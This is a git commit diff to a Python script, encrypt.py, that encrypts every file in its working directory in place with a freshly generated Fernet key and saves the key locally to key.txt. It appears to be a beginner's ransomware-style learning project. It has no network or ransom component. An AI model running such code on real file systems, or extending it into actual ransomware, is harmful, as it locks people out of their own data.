a0792da87f96023fd711a58b67b7d652295efd84
Eriberto-SG <eribertosg.dev@gmail.com>
2022-10-30 20:57:53 -0600

    Se cambio el nombre del archivo que guarda laclave. Se listaron todos los archivos encriptados

--- encrypt.py
+++ encrypt.py
@@ -6,12 +6,10 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-    if file == "encrypt.py" or file == ".gitignore" or file == "key.key":
+    if file == "encrypt.py" or file == "decrypt.py" or file == ".gitignore" or file == "key.txt":
         continue
     if os.path.isfile(file):
         files.append(file)
-
-print(files)
 
 #* Library to encrypt files with random key
 
@@ -19,14 +17,18 @@ key = Fernet.generate_key()
 
 #* Creating a file to save the generated password
 
-with open("allKeys.key", "wb") as allKeys: 
+with open("key.txt", "wb") as allKeys: 
     allKeys.write(key)
 
-#! Encrypt file content
+#! Loop to encrypt file content
 for file in files: 
     with open(file, "rb") as readFile: 
         contents = readFile.read()
         contents_encryted = Fernet(key).encrypt(contents)
     with open(file, "wb") as writeFile: 
         writeFile.write(contents_encryted)
-    
+
+#! Listing encrypted files
+for file in files: 
+    print("Encrypted: ", file)
+print("Number of encrypted files: ", len(files))
